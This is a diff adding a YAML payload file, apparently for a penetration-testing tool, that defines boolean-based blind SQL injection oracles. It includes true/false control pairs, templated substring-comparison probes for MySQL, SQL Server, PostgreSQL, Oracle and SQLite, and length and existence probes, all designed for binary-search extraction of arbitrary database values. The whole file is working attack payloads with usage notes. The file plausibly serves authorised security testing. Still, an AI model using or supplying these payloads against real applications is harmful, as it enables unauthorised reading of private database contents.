@@ -1,0 +1,64 @@
+# Boolean oracles. Each pair is written so the true and false forms differ only
+# in the condition -- same length class, same structure -- because any other
+# difference gives the application a second reason to respond differently and
+# ruins the oracle.
+#
+# {{IDX}} is the character position under test and {{BOUND}} the codepoint
+# boundary being compared against, so the extraction is a binary search rather
+# than a character-by-character guess.
+id: sqli/boolean
+reviewed: "2026-08-23"   # not re-verified since; treat as unreviewed, not current
+title: Boolean-based blind inference oracles
+variables: [IDX, BOUND, EXPR]
+credits:
+  - "Binary-search inference over a boolean oracle is long-standing public technique; entries are written for this project."
+entries:
+  - name: oracle control -- true
+    payload: "' AND 1=1 AND 'a'='a"
+    detect: "Must match the baseline. Send three times before trusting it."
+
+  - name: oracle control -- false
+    payload: "' AND 1=2 AND 'a'='a"
+    detect: "Must differ from the baseline in a stable, binary way. Send three times before trusting it."
+
+  - name: numeric oracle control -- true
+    payload: " AND 1=1"
+    detect: "Same control for an unquoted numeric context."
+
+  - name: numeric oracle control -- false
+    payload: " AND 1=2"
+    detect: "Pair with the numeric true form; the differential is the oracle."
+
+  - name: substring comparison (MySQL, SQL Server)
+    dbms: [mysql, mssql]
+    payload: "' AND ASCII(SUBSTRING(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
+    detect: "True when the character at position {{IDX}} sits above the boundary; halve the range on each request."
+
+  - name: substring comparison (PostgreSQL)
+    dbms: [postgresql]
+    payload: "' AND ASCII(SUBSTR(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
+    detect: "PostgreSQL spells the function SUBSTR; the search is otherwise identical."
+
+  - name: substring comparison (Oracle)
+    dbms: [oracle]
+    payload: "' AND ASCII(SUBSTR(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
+    detect: "Oracle uses SUBSTR and requires the subquery in {{EXPR}} to carry its own FROM clause."
+
+  - name: substring comparison (SQLite)
+    dbms: [sqlite]
+    payload: "' AND UNICODE(SUBSTR(({{EXPR}}),{{IDX}},1))>{{BOUND}} AND 'a'='a"
+    detect: "SQLite exposes UNICODE rather than ASCII; behaviour is equivalent for the ASCII range."
+
+  - name: length probe
+    payload: "' AND LENGTH(({{EXPR}}))>{{BOUND}} AND 'a'='a"
+    detect: "Bound the value's length before extracting it, so the request count is known in advance."
+    note: "SQL Server spells this LEN rather than LENGTH; use the SQL Server length probe entry there."
+
+  - name: length probe (SQL Server)
+    dbms: [mssql]
+    payload: "' AND LEN(({{EXPR}}))>{{BOUND}} AND 'a'='a"
+    detect: "SQL Server's spelling of the same probe."
+
+  - name: existence probe
+    payload: "' AND ({{EXPR}}) IS NOT NULL AND 'a'='a"
+    detect: "Confirms the expression resolves at all before spending requests reading it character by character."
